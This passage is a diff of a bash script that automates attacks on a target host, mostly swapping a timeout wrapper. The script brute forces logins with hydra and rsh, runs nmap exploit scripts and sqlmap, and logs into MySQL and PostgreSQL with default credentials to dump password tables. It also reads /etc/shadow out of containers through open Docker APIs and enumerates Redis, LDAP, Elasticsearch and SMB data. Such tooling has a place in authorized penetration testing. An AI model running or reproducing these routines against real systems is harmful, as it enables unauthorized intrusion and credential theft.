         nmap -T3 -Pn -p $scanports --script=auth -oN "$RECONDIR"/${TARGET}.nmap-auth $TARGET
 
-    screen -dmS ${TARGET}.nmap-exploitvuln.$RANDOM $TIMEOUT 28800 \
+    screen -dmS ${TARGET}.nmap-exploitvuln.$RANDOM timeout --kill-after=10 --foreground 28800 \
         nmap -T3 -Pn -p $scanports --script=exploit,vuln -oN "$RECONDIR"/${TARGET}.nmap-exploitvuln $TARGET
 
-    screen -dmS ${TARGET}.nmap-discoverysafe.$RANDOM $TIMEOUT 28800 \
+    screen -dmS ${TARGET}.nmap-discoverysafe.$RANDOM timeout --kill-after=10 --foreground 28800 \
         nmap -T3 -Pn -p $scanports --script=discovery,safe -oN "$RECONDIR"/${TARGET}.nmap-discoverysafe $TARGET
     
-
     return 0
 }    
 ################################################################################
@@ -783,7 +876,7 @@ function snmpScan()
         /usr/share/routersploit/routersploit/wordlists/snmp.txt \
         |egrep -v '^#'|sort -u )
     do
-        echo "snmp-check -c $community $IP 2>&1 \
+        echo "snmp-check -c '$community' $IP 2>&1 \
             |egrep -v '^snmp-check |^Copyright |SNMP request timeout' \
             >>\"$RECONDIR\"/tmp/${TARGET}.snmp-check 2>&1" \
             >> "$RECONDIR"/tmp/${TARGET}.snmp-check.sh
@@ -792,7 +885,7 @@ function snmpScan()
         && mv -f \"$RECONDIR\"/tmp/${TARGET}.snmp-check \"$RECONDIR\"/${TARGET}.snmp-check" \
         >>"$RECONDIR"/tmp/${TARGET}.snmp-check.sh
     chmod 700 "$RECONDIR"/tmp/${TARGET}.snmp-check.sh
-    screen -dmS ${TARGET}.snmp-check.$RANDOM $TIMEOUT 3600 "$RECONDIR"/tmp/${TARGET}.snmp-check.sh
+    screen -dmS ${TARGET}.snmp-check.$RANDOM timeout --kill-after=10 --foreground 3600 "$RECONDIR"/tmp/${TARGET}.snmp-check.sh
 
     return 0
 }
@@ -822,7 +915,7 @@ function basicEyeWitness()
         echo "FAILED: no nmap xml file"
         return 1
     fi
-    screen -dmS ${TARGET}.ew.$RANDOM $TIMEOUT 3600 \
+    screen -dmS ${TARGET}.ew.$RANDOM timeout --kill-after=10 --foreground 3600 \
         eyewitness --threads 1 -d "$RECONDIR"/${TARGET}.basicEyeWitness \
         --no-dns --no-prompt --all-protocols -x "$RECONDIR"/${TARGET}.xml
 
@@ -867,7 +960,7 @@ function rshBrute()
 
     for login in $(cat "$RECONDIR"/tmp/users.lst)
     do
-        $TIMEOUT 900 netkit-rsh -l $login $TARGET id -a 2>&1 |grep -v 'Permission denied' \
+        timeout --kill-after=10 --foreground 900 netkit-rsh -l $login $TARGET id -a 2>&1 |grep -v 'Permission denied' \
             >>"$RECONDIR"/${TARGET}.rsh 
     done
 
@@ -881,16 +974,16 @@ function nfsScan()
     local output
     local i
 
-    ( $TIMEOUT 90 showmount -e ${TARGET} >"$RECONDIR"/${TARGET}.showmount-e 2>&1 \
+    ( timeout --kill-after=10 --foreground 90 showmount -e ${TARGET} >"$RECONDIR"/${TARGET}.showmount-e 2>&1 \
         || rm -f "$RECONDIR"/${TARGET}.showmount-e >/dev/null 2>&1 ) &
-    ( $TIMEOUT 90 showmount -a ${TARGET} >"$RECONDIR"/${TARGET}.showmount-a 2>&1 \
+    ( timeout --kill-after=10 --foreground 90 showmount -a ${TARGET} >"$RECONDIR"/${TARGET}.showmount-a 2>&1 \
         || rm -f "$RECONDIR"/${TARGET}.showmount-a >/dev/null 2>&1 ) &
 
 
     # the nfs-ls nse script only works half the time
     for i in {1..10}
     do
-        output=$($TIMEOUT 60 nmap -Pn -p 111 --script=nfs-ls $TARGET 2>&1)
+        output=$(timeout --kill-after=10 --foreground 60 nmap -Pn -p 111 --script=nfs-ls $TARGET 2>&1)
         if echo $output|grep -q nfs-ls:
         then
             echo "$output" > "$RECONDIR"/${TARGET}.nmap-nfsls
@@ -923,14 +1016,14 @@ function dnsScan()
 
     if [[ $domain =~ ^..* ]]
     then
-        $TIMEOUT 90 dnsenum --dnsserver $TARGET -f "$RECONDIR"/tmp/dns.lst --nocolor --enum -p0 $domain \
+        timeout --kill-after=10 --foreground 90 dnsenum --dnsserver $TARGET -f "$RECONDIR"/tmp/dns.lst --nocolor --enum -p0 $domain \
             >>"$RECONDIR"/${TARGET}.dnsenum 2>&1 &
-        $TIMEOUT 90 dnsrecon -d $domain -n $TARGET >>"$RECONDIR"/${TARGET}.dnsrecon 2>&1 
+        timeout --kill-after=10 --foreground 90 dnsrecon -d $domain -n $TARGET >>"$RECONDIR"/${TARGET}.dnsrecon 2>&1 
         host -a $domain. $TARGET >>"$RECONDIR"/${TARGET}.host-a 2>&1 &
         host -l $domain. $TARGET >>"$RECONDIR"/${TARGET}.host-l 2>&1 &
     fi
 
-    $TIMEOUT 900 dnsrecon -n $TARGET -r ${IP%.*}.0-${IP%.*}.255  \
+    timeout --kill-after=10 --foreground 900 dnsrecon -n $TARGET -r ${IP%.*}.0-${IP%.*}.255  \
         >>"$RECONDIR"/${TARGET}.dnsreconptr.local 2>&1 
 
     mkdir -p "$RECONDIR"/${TARGET}.arpas >/dev/null 2>&1
@@ -946,7 +1039,7 @@ function dnsScan()
                 sleep 3
                 tmp[10$a$b]=$(host -a $b.$a.10.in-addr.arpa. ${TARGET} 2>&1)
             fi  
-            if ! echo "${tmp[10$a$b]}" | grep -q "Host $b.$a.10.in-addr.arpa. not found:"
+            if ! echo "${tmp[10$a$b]}" | grep -q " not found:"
             then
                 echo "${tmp[10$a$b]}" > "$RECONDIR"/${TARGET}.arpas/$b.$a.10.in-addr.arpa. 
             fi  
@@ -968,7 +1061,7 @@ function dnsScan()
                 sleep 3
                 tmp[172$a$b]=$(host -a $b.$a.172.in-addr.arpa. ${TARGET} 2>&1)
             fi  
-            if ! echo "${tmp[172$a$b]}" | grep -q "Host $b.$a.172.in-addr.arpa. not found:"
+            if ! echo "${tmp[172$a$b]}" | grep -q " not found:"
             then
                 echo "${tmp[172$a$b]}" > "$RECONDIR"/${TARGET}.arpas/$b.$a.172.in-addr.arpa. 
             fi  
@@ -988,7 +1081,7 @@ function dnsScan()
             sleep 3
             tmp[192168$a$b]=$(host -a $a.168.192.in-addr.arpa. ${TARGET} 2>&1)
         fi  
-        if ! echo "${tmp[192168$a$b]}" | grep -q "Host $a.168.192.in-addr.arpa. not found:"
+        if ! echo "${tmp[192168$a$b]}" | grep -q " not found:"
         then
             echo "${tmp[192168$a$b]}" > "$RECONDIR"/${TARGET}.arpas/$a.168.192.in-addr.arpa. 
         fi  
@@ -1032,14 +1125,14 @@ function dnsScan()
         |egrep "\s+IN\s+SOA\s" |awk '{print $1}' |sed -e 's/.in-addr.arpa.*//g' |sort -u)
     do
         IFS='.' subnet=($arpa)
-        IFS=' '
+        IFS=$'\n'
         if [[ ${#subnet[@]} -eq 2 ]]
         then
-            $TIMEOUT 1800 dnsrecon -n $TARGET -r ${subnet[1]}.${subnet[0]}.0.0/16 \
+            timeout --kill-after=10 --foreground 1800 dnsrecon -n $TARGET -r ${subnet[1]}.${subnet[0]}.0.0/16 \
                 >>"$RECONDIR"/${TARGET}.dnsreconptr.${subnet[1]}.${subnet[0]} 2>&1 
         elif [[ ${#subnet[@]} -eq 3 ]]
         then
-            $TIMEOUT 1800 dnsrecon -n $TARGET -r ${subnet[2]}.${subnet[1]}.${subnet[0]}.0/24 \
+            timeout --kill-after=10 --foreground 1800 dnsrecon -n $TARGET -r ${subnet[2]}.${subnet[1]}.${subnet[0]}.0/24 \
                 >>"$RECONDIR"/${TARGET}.dnsreconptr.${subnet[2]}.${subnet[1]}.${subnet[0]} 2>&1 
         fi
 
@@ -1053,7 +1146,7 @@ function dnsScan()
 function ikeScan()
 {
     local port=$1
-    $TIMEOUT 90 ike-scan -d $port $TARGET >>"$RECONDIR"/${TARGET}.${port}.ike-scan 2>&1 
+    timeout --kill-after=10 --foreground 90 ike-scan -d $port $TARGET >>"$RECONDIR"/${TARGET}.${port}.ike-scan 2>&1 
 
     return 0
 }
@@ -1065,13 +1158,13 @@ function rsyncScan()
     local port=$1
     local share
 
-    $TIMEOUT 90 rsync --list-only --port=$port rsync://$TARGET >>"$RECONDIR"/${TARGET}.${port}.rsync 2>&1 \
+    timeout --kill-after=10 --foreground 90 rsync --list-only --port=$port rsync://$TARGET >>"$RECONDIR"/${TARGET}.${port}.rsync 2>&1 \
         || rm -f "$RECONDIR"/${TARGET}.${port}.rsync >/dev/null 2>&1
     if [[ -f  "$RECONDIR"/${TARGET}.${port}.rsync ]]
     then
         for share in $(cat "$RECONDIR"/${TARGET}.${port}.rsync)
         do
-            $TIMEOUT 600 rsync --list-only --port=${port%%/*} rsync://$TARGET/$share \
+            timeout --kill-after=10 --foreground 600 rsync --list-only --port=${port%%/*} rsync://$TARGET/$share \
                 >>"$RECONDIR"/${TARGET}.${port}.rsync-$share 2>&1 
         done
     fi
@@ -1091,7 +1184,7 @@ function smbScan()
     do
         echo "####################" >>"$RECONDIR"/${TARGET}.smbdirs
         echo "//$TARGET/$share" >>"$RECONDIR"/${TARGET}.smbdirs
-        $TIMEOUT 90 smbclient -N -c dir //$TARGET/"$share" >>"$RECONDIR"/${TARGET}.smbdirs 2>&1
+        timeout --kill-after=10 --foreground 90 smbclient -N -c dir //$TARGET/"$share" >>"$RECONDIR"/${TARGET}.smbdirs 2>&1
         echo "" >>"$RECONDIR"/${TARGET}.smbdirs
         echo "" >>"$RECONDIR"/${TARGET}.smbdirs
     done
@@ -1099,7 +1192,7 @@ function smbScan()
     do
         echo "####################" >>"$RECONDIR"/${TARGET}.rpcclient
         echo "cmd: $cmd" >>"$RECONDIR"/${TARGET}.rpcclient
-        $TIMEOUT 90 rpcclient -U "" $TARGET -N -c $cmd >>"$RECONDIR"/${TARGET}.rpcclient 2>&1
+        timeout --kill-after=10 --foreground 90 rpcclient -U "" $TARGET -N -c $cmd >>"$RECONDIR"/${TARGET}.rpcclient 2>&1
         echo "" >>"$RECONDIR"/${TARGET}.rpcclient
         echo "" >>"$RECONDIR"/${TARGET}.rpcclient
     done
@@ -1115,7 +1208,7 @@ function mysqlScan()
     local db
 
     echo "show databases" >> "$RECONDIR"/${TARGET}.mysql.$port 2>&1
-    $TIMEOUT 60 mysql -E -u root -e 'show databases;' --connect-timeout=30 -h $TARGET \
+    timeout --kill-after=10 --foreground 60 mysql -E -u root -e 'show databases;' --connect-timeout=30 -h $TARGET \
         >> "$RECONDIR"/${TARGET}.mysql.$port 2>&1
 
 
@@ -1123,18 +1216,18 @@ function mysqlScan()
     do
         echo "$BORDER" >> "$RECONDIR"/${TARGET}.mysql.$port 2>&1
         echo "Tables from database $db" >> "$RECONDIR"/${TARGET}.mysql.$port 2>&1
-        $TIMEOUT 60 mysql -E -u root -D "$db" -e 'show tables;' --connect-timeout=30 -h $TARGET \
+        timeout --kill-after=10 --foreground 60 mysql -E -u root -D "$db" -e 'show tables;' --connect-timeout=30 -h $TARGET \
             |grep -v 'row *' >> "$RECONDIR"/${TARGET}.mysql.$port 2>&1
     done
 
     echo "$BORDER" >> "$RECONDIR"/${TARGET}.mysql.$port 2>&1
     echo "show full processlist;" >> "$RECONDIR"/${TARGET}.mysql.$port 2>&1
-    $TIMEOUT 60 mysql -E -u root -e 'show full processlist;' --connect-timeout=30 -h $TARGET \
+    timeout --kill-after=10 --foreground 60 mysql -E -u root -e 'show full processlist;' --connect-timeout=30 -h $TARGET \
         >> "$RECONDIR"/${TARGET}.mysql.$port 2>&1
 
     echo "$BORDER" >> "$RECONDIR"/${TARGET}.mysql.$port 2>&1
     echo "select host,user,password from mysql.user;" >> "$RECONDIR"/${TARGET}.mysql.$port 2>&1
-    $TIMEOUT 60 mysql -E -u root -e 'select host,user,password from mysql.user;' --connect-timeout=30 -h $TARGET \
+    timeout --kill-after=10 --foreground 60 mysql -E -u root -e 'select host,user,password from mysql.user;' --connect-timeout=30 -h $TARGET \
         >> "$RECONDIR"/${TARGET}.mysql.$port 2>&1
 
     return 0
@@ -1146,7 +1239,7 @@ function passHydra()
 {
     local port=$1
     local service=$2
-    local file="/usr/share/seclists/Passwords/Default-Credentials/$3"
+    local file=$3
 
     if [[ ! -f "$file" ]]
     then
@@ -1154,14 +1247,15 @@ function passHydra()
         return 1
     fi
 
-    $TIMEOUT 28800 hydra -I \
+    timeout --kill-after=10 --foreground 28800 hydra -I \
         -P $file \
         -u -t 1 -s $port $TARGET $service \
         >> "$RECONDIR"/${TARGET}.$service.$port.hydra 2>&1
-    if ! grep -q 'valid pair found' "$RECONDIR"/${TARGET}.$service.$port.hydra 2>/dev/null
-    then
-        rm -f "$RECONDIR"/${TARGET}.$service.$port.hydra 2>/dev/null
-    fi
+
+#    if ! grep -q 'successfully completed' "$RECONDIR"/${TARGET}.$service.$port.hydra 2>/dev/null
+#    then 
+#        rm -f "$RECONDIR"/${TARGET}.$service.$port.hydra 2>/dev/null
+#    fi       
 
     return 0
 }
@@ -1180,14 +1274,15 @@ function doHydra()
         return 1
     fi
 
-    $TIMEOUT 28800 hydra -I \
+    timeout --kill-after=10 --foreground 28800 hydra -I \
         -C $file \
         -u -t 1 -s $port $TARGET $service \
         >> "$RECONDIR"/${TARGET}.$service.$port.hydra 2>&1
-    if ! grep -q 'valid pair found' "$RECONDIR"/${TARGET}.$service.$port.hydra 2>/dev/null
-    then
-        rm -f "$RECONDIR"/${TARGET}.$service.$port.hydra 2>/dev/null
-    fi
+
+#    if ! grep -q 'successfully completed' "$RECONDIR"/${TARGET}.$service.$port.hydra 2>/dev/null
+#    then 
+#        rm -f "$RECONDIR"/${TARGET}.$service.$port.hydra 2>/dev/null
+#    fi       
 
     return 0
 }
@@ -1199,25 +1294,31 @@ function postgresqlScan()
     local port=$1
     local db
 
-    $TIMEOUT 60 psql -h $TARGET -p $port -U postgres -l -x \
+    # set password var.  It will only be used if postgres asks for it.
+    export PGPASSWORD=postgres
+
+    timeout --kill-after=10 --foreground 60 psql -w -h $TARGET -p $port -U postgres -l -x \
         >> "$RECONDIR"/${TARGET}.postgresql.$port 2>&1
 
     for db in $(cat "$RECONDIR"/${TARGET}.postgresql.$port |awk '/^Name/ {print $3}')
     do
         echo "$BORDER" >> "$RECONDIR"/${TARGET}.postgresql.$port 2>&1
         echo "Tables from database $db" >> "$RECONDIR"/${TARGET}.postgresql.$port 2>&1
-        $TIMEOUT 60 psql -c 'SELECT * FROM pg_catalog.pg_tables;' -d $db \
+        timeout --kill-after=10 --foreground 60 \
+            psql -w -h $TARGET -p $port -U postgres -x -c 'SELECT * FROM pg_catalog.pg_tables;' -d $db \
             >> "$RECONDIR"/${TARGET}.postgresql.$port 2>&1
     done
 
     echo "$BORDER" >> "$RECONDIR"/${TARGET}.postgresql.$port 2>&1
     echo "select * from pg_stat_activity" >> "$RECONDIR"/${TARGET}.postgresql.$port 2>&1
-    $TIMEOUT 60 psql -h $TARGET -p $port -U postgres -x -c 'select * from pg_stat_activity;' \
+    timeout --kill-after=10 --foreground 60 \
+        psql -w -h $TARGET -p $port -U postgres -x -c 'select * from pg_stat_activity;' \
         >> "$RECONDIR"/${TARGET}.postgresql.$port 2>&1
 
     echo "$BORDER" >> "$RECONDIR"/${TARGET}.postgresql.$port 2>&1
     echo "select * from pg_catalog.pg_shadow" >> "$RECONDIR"/${TARGET}.postgresql.$port 2>&1
-    $TIMEOUT 60 psql -h $TARGET -p $port -U postgres -x -c 'select * from pg_catalog.pg_shadow;' \
+    timeout --kill-after=10 --foreground 60 \
+        psql -w -h $TARGET -p $port -U postgres -x -c 'select * from pg_catalog.pg_shadow;' \
         >> "$RECONDIR"/${TARGET}.postgresql.$port 2>&1
 
     return 0
@@ -1231,28 +1332,28 @@ function dockerScan()
     local proto=$2
     local id
 
-    $TIMEOUT 60 curl -k -s ${proto}://${TARGET}:$port/info 2>/dev/null|jq -M . \
+    timeout --kill-after=10 --foreground 60 curl -k -s ${proto}://${TARGET}:$port/info 2>/dev/null|jq -M . \
         >> "$RECONDIR"/${TARGET}.dockerinfo.${port} 2>&1
 
-    $TIMEOUT 60 curl -k -s ${proto}://${TARGET}:$port/networks 2>/dev/null|jq -M . \
+    timeout --kill-after=10 --foreground 60 curl -k -s ${proto}://${TARGET}:$port/networks 2>/dev/null|jq -M . \
         >> "$RECONDIR"/${TARGET}.dockernetworks.${port} 2>&1
 
-    $TIMEOUT 60 curl -k -s ${proto}://${TARGET}:$port/containers/json 2>/dev/null|jq -M . \
+    timeout --kill-after=10 --foreground 60 curl -k -s ${proto}://${TARGET}:$port/containers/json 2>/dev/null|jq -M . \
         >> "$RECONDIR"/${TARGET}.dockercontainers.${port} 2>&1
 
     for id in $(grep '"Id": ' "$RECONDIR"/${TARGET}.dockercontainers.${port} |cut -d'"' -f4)
     do
-        $TIMEOUT 60 curl -k -s ${proto}://${TARGET}:${port}/containers/${id}/top 2>/dev/null|jq -M . \
+        timeout --kill-after=10 --foreground 60 curl -k -s ${proto}://${TARGET}:${port}/containers/${id}/top 2>/dev/null|jq -M . \
             >> "$RECONDIR"/dockertop.${port}.${id}
-        $TIMEOUT 60 curl -k -s ${proto}://${TARGET}:${port}/containers/${id}/changes 2>/dev/null|jq -M . \
+        timeout --kill-after=10 --foreground 60 curl -k -s ${proto}://${TARGET}:${port}/containers/${id}/changes 2>/dev/null|jq -M . \
             >> "$RECONDIR"/dockerchanges.${port}.${id}
-        $TIMEOUT 60 curl -k -s "${proto}://${TARGET}:${port}/containers/${id}/archive?path=/etc/shadow" \
+        timeout --kill-after=10 --foreground 60 curl -k -s "${proto}://${TARGET}:${port}/containers/${id}/archive?path=/etc/shadow" \
             2>/dev/null|tar xf - -O \
             >> "$RECONDIR"/dockershadow.${port}.${id} 2>/dev/null
 
     done
 
-    $TIMEOUT 60 curl -k -s ${proto}://${TARGET}:${port}/v2/_catalog 2>/dev/null|jq -M . \
+    timeout --kill-after=10 --foreground 60 curl -k -s ${proto}://${TARGET}:${port}/v2/_catalog 2>/dev/null|jq -M . \
         >> "$RECONDIR"/${TARGET}.dockerepo.${port} 2>&1
 
     return 0
@@ -1264,7 +1365,7 @@ function iscsiScan()
 {
     local port=$1
 
-    $TIMEOUT 90 iscsiadm -m discovery -t st -p ${TARGET}:${port} \
+    timeout --kill-after=10 --foreground 90 iscsiadm -m discovery -t st -p ${TARGET}:${port} \
         >> "$RECONDIR"/${TARGET}.iscsiadm.${port} 2>&1
 
     return 0
@@ -1279,8 +1380,8 @@ function elasticsearchScan()
     local index
     local indexes=()
 
-    $TIMEOUT 90 curl -k -s "${proto}://${TARGET}:${port}/_cat/indices?v" > "$RECONDIR"/${TARGET}.elasticsearch.${port} 2>&1
-    $TIMEOUT 90 curl -k -s "${proto}://${TARGET}:${port}/_all/_settings" 2>&1 |jq . > "$RECONDIR"/${TARGET}.elasticsearch.${port}._all_settings 
+    timeout --kill-after=10 --foreground 90 curl -k -s "${proto}://${TARGET}:${port}/_cat/indices?v" > "$RECONDIR"/${TARGET}.elasticsearch.${port} 2>&1
+    timeout --kill-after=10 --foreground 90 curl -k -s "${proto}://${TARGET}:${port}/_all/_settings" 2>&1 |jq . > "$RECONDIR"/${TARGET}.elasticsearch.${port}._all_settings 
 
     if [[ -f "$RECONDIR"/${TARGET}.elasticsearch.${port} ]]
     then
@@ -1304,7 +1405,7 @@ function elasticsearchScan()
 
         for index in ${indexes[@]}
         do
-            $TIMEOUT 60 curl -k -s "${proto}://${TARGET}:${port}/${index}/_stats" 2>/dev/null |jq . \
+            timeout --kill-after=10 --foreground 60 curl -k -s "${proto}://${TARGET}:${port}/${index}/_stats" 2>/dev/null |jq . \
                 > "$RECONDIR"/${TARGET}.elasticsearch.indexes.${port}/$index 2>&1
         done
     fi
@@ -1321,7 +1422,7 @@ function redisScan()
 
     for i in {0..16}
     do
-        $TIMEOUT 90 redis-cli -h $TARGET -p $port -n $i --scan \
+        timeout --kill-after=10 --foreground 90 redis-cli -h $TARGET -p $port -n $i --scan \
             >> "$RECONDIR"/${TARGET}.redis.${port} 2>&1
     done
 
@@ -1335,12 +1436,12 @@ function ldapScan()
     local port=$1
     local context
 
-    $TIMEOUT 120 ldapsearch -h $TARGET -p $port -x -s base \
+    timeout --kill-after=10 --foreground 120 ldapsearch -h $TARGET -p $port -x -s base \
         >> "$RECONDIR"/${TARGET}.ldap.${port} 2>&1
 
     for context in $(awk '/^namingContexts: / {print $2}' "$RECONDIR"/${TARGET}.ldap.${port})
     do
-        $TIMEOUT 300 ldapsearch -h $TARGET -p $port -x -b "$context" \
+        timeout --kill-after=10 --foreground 300 ldapsearch -h $TARGET -p $port -x -b "$context" \
             >> "$RECONDIR"/${TARGET}.ldap.${port}.${context} 2>&1
     done
 
@@ -1365,7 +1466,7 @@ function webDiscover()
     local wordlist
     local urlfile
 
-
+    IFS=$'\n'
     # Build dirb dictionary array
     for wordlist in /usr/share/dirb/wordlists/common.txt \
     /usr/share/dirb/wordlists/vulns/*txt \
@@ -1383,6 +1484,7 @@ function webDiscover()
     done
 
     # first run through baseurls
+    # Get robots.txt and spider the baseurls
     for url in $(cat "$RECONDIR"/${TARGET}.baseurls)
     do
         urlfile=${url//\//,}
@@ -1402,13 +1504,13 @@ function webDiscover()
             then
                 a_robots[${#a_robots[@]}]="${url}${robotdir}"
             fi
-            $TIMEOUT 60 \
+            timeout --kill-after=10 --foreground 60 \
                 wget --no-check-certificate -r -l3 --spider --force-html -D $TARGET ${url}${robotdir} 2>&1 \
                 | grep '^--' |grep -v '(try:' | awk '{ print $3 }' \
                 >> "$RECONDIR"/tmp/${TARGET}.robotspider.raw 2>/dev/null
         done
 
-        $TIMEOUT 60 wget --no-check-certificate -r -l3 --spider --force-html -D $TARGET "$url" 2>&1 \
+        timeout --kill-after=10 --foreground 60 wget --no-check-certificate -r -l3 --spider --force-html -D $TARGET "$url" 2>&1 \
             | grep '^--' |grep -v '(try:' | awk '{ print $3 }' |grep "/$TARGET[:/]"  \
             >> "$RECONDIR"/tmp/${TARGET}.spider.raw 2>/dev/null
     done
@@ -1422,26 +1524,12 @@ function webDiscover()
         for dirbfile in ${a_dirbfiles[@]}
         do
             shortfile=${dirbfile##*/}
-            $TIMEOUT 1800 dirb "$url" "$dirbfile" -r -f -S \
+            timeout --kill-after=10 --foreground 1800 dirb "$url" "$dirbfile" -r -f -S \
                 >> "$RECONDIR"/tmp/${TARGET}.dirb/${TARGET}-${shortfile}.dirb 2>&1
         done
     done
 
-    # run dirb on everything robots.txt tells us to ignore
-    for url in ${a_robots[@]}
-    do
-        for dirbfile in ${a_dirbfiles[@]}
-        do
-            shortfile=${dirbfile##*/}
-            # check if dirb was already run on this url
-            if ! grep -q "$url" "$RECONDIR"/tmp/${TARGET}.dirb/${TARGET}-${shortfile}.dirb 2>/dev/null
-            then
-                $TIMEOUT 1800 dirb "$url" "$dirbfile" -r -f -S \
-                    >> "$RECONDIR"/tmp/${TARGET}.dirb/${TARGET}-robots-${shortfile}.dirb 2>&1
-            fi
-        done
-    done
-
+    # build html file from robots.txt files
     for url in $(cat "$RECONDIR"/tmp/${TARGET}.robotspider.raw 2>/dev/null|sort -u)
     do
         echo "<a href=\"$url\">$url</a><br>" >> "$RECONDIR"/${TARGET}.robotspider.html
@@ -1466,7 +1554,7 @@ function webDiscover()
 
     for url in $(cat "$RECONDIR"/${TARGET}.dirburls 2>/dev/null )
     do
-        $TIMEOUT 120 wget --no-check-certificate -r -l2 --spider --force-html -D $TARGET "$url" 2>&1 \
+        timeout --kill-after=10 --foreground 120 wget --no-check-certificate -r -l2 --spider --force-html -D $TARGET "$url" 2>&1 \
             | grep '^--' |grep -v '(try:' |egrep "$IP|$TARGET" | awk '{ print $3 }' \
             >> "$RECONDIR"/tmp/${TARGET}.spider.raw 2>/dev/null
     done
@@ -1533,9 +1621,8 @@ function niktoScan()
         # Run nikto in the background
         urlfile=${url//\//,}
         screen -dmS ${TARGET}.nikto.$RANDOM -L -Logfile "$RECONDIR"/${urlfile}.nikto \
-            $TIMEOUT 900 nikto -no404 -host "$url"
+            timeout --kill-after=10 --foreground 900 nikto -no404 -host "$url"
     done
-
 
     return 0
 }
@@ -1550,7 +1637,7 @@ function getHeaders()
     do 
         echo "$BORDER" >> "$RECONDIR"/${TARGET}.headers 2>&1
         echo "$url" >> "$RECONDIR"/${TARGET}.headers
-        $TIMEOUT 30 wget -q -O /dev/null --no-check-certificate -S  -D $TARGET --method=OPTIONS "$url" \
+        timeout --kill-after=10 --foreground 30 wget -q -O /dev/null --no-check-certificate -S  -D $TARGET --method=OPTIONS "$url" \
             >> "$RECONDIR"/${TARGET}.headers 2>&1
     done
 
@@ -1600,7 +1687,7 @@ function hydraScanURLs()
         # Test with separate user/pass files
         echo "TESTING $url"  >> "$RECONDIR"/${TARGET}.hydra/${hydrafile} 2>&1
         echo "$BORDER"  >> "$RECONDIR"/${TARGET}.hydra/${hydrafile} 2>&1
-        $TIMEOUT 900 hydra -I -L "$RECONDIR"/tmp/users.lst \
+        timeout --kill-after=10 --foreground 900 hydra -I -L "$RECONDIR"/tmp/users.lst \
             -P "$RECONDIR"/tmp/passwds.lst -e nsr \
             -u -t 3 $sslflag -s $port $TARGET http-get "$path" \
             >> "$RECONDIR"/${TARGET}.hydra/${hydrafile} 2>&1
@@ -1608,12 +1695,12 @@ function hydraScanURLs()
         # Test with default creds from routersploit
         echo "TESTING $url"  >> "$RECONDIR"/${TARGET}.hydra/${hydrafile} 2>&1
         echo "$BORDER"  >> "$RECONDIR"/${TARGET}.hydra/${hydrafile} 2>&1
-        $TIMEOUT 900 hydra -I 
+        timeout --kill-after=10 --foreground 900 hydra -I \
             -C /usr/share/routersploit/routersploit/wordlists/defaults.txt \
             -u -t 3 $sslflag -s $port $TARGET http-get "$path" \
             >> "$RECONDIR"/${TARGET}.hydra/${hydrafile} 2>&1
 
-        grep -q 'valid pair found' "$RECONDIR"/${TARGET}.hydra/${hydrafile} \
+        grep -q 'successfully completed' "$RECONDIR"/${TARGET}.hydra/${hydrafile} \
             && cp -f "$RECONDIR"/${TARGET}.hydra/${hydrafile} "$RECONDIR"/${TARGET}.${hydrafile} 2>/dev/null
     done
     #remove directory if empty
@@ -1631,8 +1718,8 @@ function sqlmapScan()
 
     for url in $(grep '?' "$RECONDIR"/${TARGET}.spider 2>/dev/null)
     do
-        $TIMEOUT 300 sqlmap --random-agent --batch --flush-session -a -u "$url" 2>&1 \
-            |egrep -v '\[INFO\] (testing|checking|target|flushing|heuristics|confirming|searching|dynamic|URI parameter)|\[WARNING\]|\[CRITICAL\]|shutting down|starting at|do you want to try|legal disclaimer:|404 \(Not Found\)|how do you want to proceed|it is not recommended|do you want sqlmap to try|^\|_|^ ___|^      \||^       __H|^        ___|fetched random HTTP User-Agent|there was an error checking|Do you want to follow|Do you want to try|Method Not Allowed|do you want to skip' \
+        timeout --kill-after=10 --foreground 300 sqlmap --random-agent --batch --flush-session -a -u "$url" 2>&1 \
+            |egrep -v '\[INFO\] (testing|checking|target|flushing|heuristics|confirming|searching|dynamic|URI parameter)|\[WARNING\]|\[CRITICAL\]|shutting down|starting at|do you want to try|legal disclaimer:|404 \(Not Found\)|how do you want to proceed|it is not recommended|do you want sqlmap to try|^\|_|^ ___|^      \||^       __H|^        ___|fetched random HTTP User-Agent|there was an error checking|Do you want to follow|Do you want to try|Method Not Allowed|do you want to skip|\[INFO\] GET parameter .* is dynamic' \
             |uniq >> "$RECONDIR"/${TARGET}.sqlmap 2>&1
     done
 
@@ -1647,7 +1734,7 @@ function webWords()
     for url in $(cat "$RECONDIR"/${TARGET}.baseurls)
     do
         # collect words from websites
-        $TIMEOUT 1800 wget -rq -D $TARGET -O "$RECONDIR"/tmp/wget.dump "$url" >/dev/null 2>&1
+        timeout --kill-after=10 --foreground 1800 wget -rq -D $TARGET -O "$RECONDIR"/tmp/wget.dump "$url" >/dev/null 2>&1
         if [[ -f "$RECONDIR"/tmp/wget.dump ]]
         then
             html2dic "$RECONDIR"/tmp/wget.dump 2>/dev/null |grep -v -P '[^\x00-\x7f]' |sort -u \
@@ -1676,7 +1763,7 @@ function cewlCrawl()
     for url in $(cat "$RECONDIR"/${TARGET}.spider 2>/dev/null )
     do
         urlfile=${url//\//,}
-        $TIMEOUT 20 cewl -d 1 -a --meta_file "$RECONDIR"/tmp/cewl/${TARGET}.${urlfile}.cewlmeta \
+        timeout --kill-after=10 --foreground 20 cewl -d 1 -a --meta_file "$RECONDIR"/tmp/cewl/${TARGET}.${urlfile}.cewlmeta \
             -e --email_file "$RECONDIR"/tmp/cewl/${TARGET}.${urlfile}.cewlemail \
             -w "$RECONDIR"/tmp/cewl/${TARGET}.${urlfile}.cewl \
             "$url" >/dev/null 2>&1 
@@ -1720,8 +1807,13 @@ function fuzzURLs()
     local wfuzzfile
     local IFS=$'\n'
     local i=0
+    local line
+    local inside
+    local row=()
 
     mkdir -p "$RECONDIR"/${TARGET}.wfuzz/raws >/dev/null 2>&1
+
+    # Pull urls from spider scan
     for url in $( egrep '?.*=' "$RECONDIR"/${TARGET}.spider \
         |egrep -v '/\?' \
         |sed -e 's/\(\?[^=]*\)=[^&]*/\1=FUZZ/g' \
@@ -1733,7 +1825,7 @@ function fuzzURLs()
         echo "none $url" >> "$RECONDIR"/tmp/${TARGET}.FUZZ.raw
     done
 
-
+    # Pull urls from mech-dump
     if [[ -f "$RECONDIR"/${TARGET}.mech-dump ]]
     then
         cat "$RECONDIR"/${TARGET}.mech-dump |while read line
@@ -1762,7 +1854,8 @@ function fuzzURLs()
                 var=$(echo $line |awk '{print $1}'|cut -d'=' -f1)=FUZZ
                 a_vars[${#a_vars[@]}]=$var
                 if [[ $var =~ user ]] \
-                || [[ $var =~ login ]]
+                || [[ $var =~ login ]] \
+                || [[ $var =~ name ]] 
                 then
